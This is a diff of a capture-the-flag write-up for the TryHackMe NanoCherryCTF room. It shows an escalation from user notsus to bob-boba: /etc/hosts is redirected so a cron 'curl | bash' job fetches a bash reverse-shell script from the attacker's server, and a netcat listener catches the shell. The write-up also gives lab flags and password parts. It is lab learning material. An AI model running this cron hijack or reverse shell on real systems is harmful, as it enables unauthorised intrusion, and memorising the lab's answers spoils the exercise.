@@ -1,3 +1,35 @@
+<h1 align="center">NanoCherryCTF</h1>
+<p align="center"> <img width="160px" src="https://github.com/user-attachments/assets/4f58f330-acaf-469d-9d2f-1c4822e39fa2"><br>
+Jun 4, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
+part of my 396-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
+Explore a double-sided site and escalate to root! <a href="https://tryhackme.com/room/nanocherryctf"</a>here.<br><br>
+<img width="1000px" src=""></p>
+
+<br>
+
+<h2>Task 1 . Story, Deployment, and Setup</h2>
+
+<p>[ ... ]
+  
+
+<h3 align="left">Answer the question below</h3>
+
+> 1.1. <em>I updated my /etc/hosts file and read the story!</em><br><a id='1.1'></a>
+>> <strong><code>No answer needed</code></strong><br>
+
+<br>
+<br>
+
+<h2>Task 2 . NanoCherryCTFp</h2>
+
+<p>[ ... ]
+  
+
+<h3 align="left">Answer the questions below</h3>
+
+> 2.3. <em>What is the third part of Chad Cherry's password?</em><br><a id='2.3'></a>
+>> <strong><code>7h3fu7ur3</code></strong><br>
+
 
 <h3>nmap</h3>
 
@@ -37,6 +69,231 @@ PORT   STATE SERVICE
 ![image](https://github.com/user-attachments/assets/1c053b95-8589-4a70-b1d1-fb354b1d53f7)
 
 ![image](https://github.com/user-attachments/assets/919e142e-baa2-49bf-a545-f65037bef738)
+
+<h3>ssh</h3>
+
+<p>Identified <code>bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash</code> in <code>/etc/crontab</p>code></p>
+
+```bash
+root@ip-10-10-57-149:~# ssh notsus@cherryontop.thm
+The authenticity of host 'cherryontop.thm (10.10.149.100)' can't be established.
+ECDSA key fingerprint is SHA256:kw1Dd9AA4stwK/J0vgxaYjvAjHA1s+TrdTbNTCuQVkQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'cherryontop.thm,10.10.149.100' (ECDSA) to the list of known hosts.
+notsus@cherryontop.thm's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-102-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Jan 15 21:29:58 2024 from 10.0.2.15
+$ pwd
+/home/.notsus
+notsus@ip-10-10-149-100:~$ ls
+backdoor.mp4  youFoundIt.txt
+notsus@ip-10-10-149-100:~$ cat youFoundIt.txt
+Hey good work hacker. Glad you made it this far!
+
+From here, we should be able to hit Bob-Boba where it hurts! Could you find a way to escalate your privileges vertically to access his account?
+
+Keep your's eyes peeled and don't be a script kiddie!
+
+- Jex
+notsus@ip-10-10-149-100:~$ sudo -l
+[sudo] password for notsus: 
+Sorry, user notsus may not run sudo on ip-10-10-149-100.
+notsus@ip-10-10-149-100:~$ find / -perm 4000 2>/dev/null
+notsus@ip-10-10-149-100:~$ find / -perm 6000 2>/dev/null
+notsus@ip-10-10-149-100:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
+notsus@ip-10-10-149-100:~$ 
+...
+```
+
+<br>
+
+<h3>Writable files</h3>
+<p>We are allowed to write to <code>/etc/hosts</code>.</p>
+
+```bash
+notsus@ip-10-10-149-100:~$ find /etc/ -writable
+find: \u2018/etc/lvm/backup\u2019: Permission denied
+find: \u2018/etc/polkit-1/localauthority\u2019: Permission denied
+find: \u2018/etc/multipath\u2019: Permission denied
+/etc/systemd/system/sudo.service
+/etc/hosts
+find: \u2018/etc/sudoers.d\u2019: Permission denied
+find: \u2018/etc/ssl/private\u2019: Permission denied
+notsus@ip-10-10-149-100:~$ 
+```
+
+<h3>Added to <code>/etc/hosts</code>code> in the Target VM</h3>
+
+<p>Added <code>AttackIP</code> and <code>cherryontop.tld</code>.</p>
+
+<h3>Navigated to the Attack VM</h3>
+<p>- Created a path <code>/home/bob-boba</code></p>
+
+```bash
+root@ip-10-10-57-149:~# mkdir home
+root@ip-10-10-57-149:~# cd home
+root@ip-10-10-57-149:~/home# mkdir bob-boba
+root@ip-10-10-57-149:~/home# cd bob-boba
+root@ip-10-10-57-149:~/home/bob-boba# nano coinflip.sh
+```
+
+<p>- Crafted a reverse shell <code>coninflip.sh</code>.</p>
+
+```bash
+#!/bin/bash
+
+/bin/bash -i >& /dev/tcp/10.10.57.149/8888 0>&1
+```
+
+<p>- Changed path.</p>
+
+```bash
+root@ip-10-10-57-149:~/home/bob-boba# cd ../../
+
+```
+
+<p>- Setup up a listener.</p>
+
+```bash
+root@ip-10-10-57-149:~# nc -nlvp 8888
+Listening on 0.0.0.0 8888
+```
+
+<p>- Setup up an http server.</p>
+
+```bash
+root@ip-10-10-57-149:~# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+<p>- Waited a bit and got the shell as <code>bob-boba</code>.</p>
+
+```bash
+root@ip-10-10-57-149:~# nc -nlvp 8888
+Listening on 0.0.0.0 8888
+Connection received on 10.10.149.100 49006
+bash: cannot set terminal process group (1442): Inappropriate ioctl for device
+bash: no job control in this shell
+bob-boba@ip-10-10-149-100:~$
+```
+
+<br>
+
+```bash
+bob-boba@ip-10-10-149-100:~$ whoami
+whoami
+bob-boba
+bob-boba@ip-10-10-149-100:~$ pwd
+pwd
+/home/bob-boba
+bob-boba@ip-10-10-149-100:~$ ls -lah
+ls -lah
+total 40K
+drwxr-x--- 4 bob-boba bob-boba 4.0K Jan  5  2024 .
+drwxr-xr-x 9 root     root     4.0K Jun  6 16:52 ..
+-rw------- 1 bob-boba bob-boba    0 Jan 10  2024 .bash_history
+-rw-r--r-- 1 bob-boba bob-boba  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 bob-boba bob-boba 3.7K Jan  6  2022 .bashrc
+drwx------ 2 bob-boba bob-boba 4.0K Jan  5  2024 .cache
+drwxrwxr-x 3 bob-boba bob-boba 4.0K Apr  8  2023 .local
+-rw-r--r-- 1 bob-boba bob-boba  807 Jan  6  2022 .profile
+-rw-rw-r-- 1 bob-boba bob-boba    0 Apr  8  2023 .selected_editor
+-rw-rw-r-- 1 bob-boba bob-boba  536 Apr  8  2023 bobLog.txt
+-rw-rw-r-- 1 bob-boba bob-boba   10 Apr  8  2023 chads-key3.txt
+-rwxrwxr-x 1 bob-boba bob-boba  191 Apr  8  2023 coinflip.sh
+bob-boba@ip-10-10-149-100:~$ 
+```
+
+<h3>Chad´s key, Part 3 : <code>7h3fu7ur3</code></h3>
+
+```bash
+bob-boba@ip-10-10-149-100:~$ cat chads-key3.txt
+cat chads-key3.txt
+7h3fu7ur3
+```
+
+> 2.1. <em>Gain access to Molly's Dashboard. What is the flag?</em><br><a id='2.1'></a>
+>> <strong><code>THM{BL4CK_M4I1}</code></strong><br>
+
+
+<p>- Inspected <code>blobLog.txt</code></p>
+
+```bash
+bob-boba@ip-10-10-149-100:~$ cat bobLog.txt
+cat bobLog.txt
+Bob Log
+
+4/10/20XX
+
+One of the funniest parts of working for Chad is both how much debt we have and how much other people owe us!
+
+I know that Chad uses me as both his accountant and debt collector, but really, we need to hire more henchmen.
+
+Perhaps we can convince the Arch Linux users to join our cause... Hopefully none of them like Vim, after all, Chad intends to eliminate every trace of the text editor and replace it with Nano.
+
+Either way, I gotta really protect this password segment Chad gave me in case of emergencies!
+
+Bob
+bob-boba@ip-10-10-149-100:~$ 
+exit
+root@ip-10-10-57-149:~# 
+
+```
+
+<p>- http server ...</p>
+
+```bash
+root@ip-10-10-57-149:~# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.149.100 - - [06/Jun/2025 18:24:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:25:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:26:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:27:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:28:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:29:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:30:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:31:01] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:32:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:33:01] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:34:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:35:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:36:01] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+10.10.149.100 - - [06/Jun/2025 18:37:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
+```
+
+<br>
 
 <p>I52WK43U = Guest</p>
 
@@ -106,12 +363,6 @@ n4n0ch3rryw1llb37h3fu7ur3</p>
 ![image](https://github.com/user-attachments/assets/80e863ed-d98b-4e4e-a4d6-25a6787a7242)
 
 
-<h3>ssh</h3>
-<p>bob-boba</p>
-
-![image](https://github.com/user-attachments/assets/95cb37bd-8c3d-40c3-a680-405035482c89)
-
-<br>
 
 ![image](https://github.com/user-attachments/assets/69804947-1026-45b9-83c8-ffce755c5d5e)
 
